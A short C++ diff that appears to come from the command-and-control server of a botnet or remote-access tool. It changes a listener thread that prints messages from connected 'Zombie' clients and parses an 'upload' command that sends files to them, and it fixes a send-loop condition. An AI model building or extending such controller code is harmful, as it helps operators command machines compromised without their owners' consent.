@@ -15,20 +15,22 @@ void recv_t_old(Server* serv1)
 		Sleep(200);
 	}
 }
+
 void listen_client(Server* serv1, const unsigned short nb)
 {
 	char buffer[256] = { 0 };
-
-	std::cout << "Dans thread recv : " << nb << std::endl;
 
 	while (strcmp(buffer, "exit") != 0)
 	{
 		std::vector<st_Client> clients = serv1->getClients();
 		if (recv(clients[nb].sock, buffer, sizeof(buffer), 0) > 0)
-			if (std::string(buffer) == "UPLOAD")
-				Transfer::uploadToClient(serv1, buffer);
+		{
+			std::vector<std::string> args = split(buffer);
+			if (args[0] == "upload" && args.size() == 2)
+				Transfer::uploadToClient(serv1, args[1]);
 			else
-				std::cout << "[*] Zombie " << nb + 1 << " : " << buffer << std::endl;
+				std::cout << "[*] Zombie " << nb + 1 << ": " << buffer << std::endl;
+		}
 		else
 			break;
 		Sleep(400);
@@ -45,7 +47,8 @@ void accept_t(Server* serv1)
 }
 void send_t(Server* serv1)
 {
-	while (serv1->getExit())
+
+	while (!serv1->getExit())
 	{
 		SetColor(8);
 		serv1->send_c();
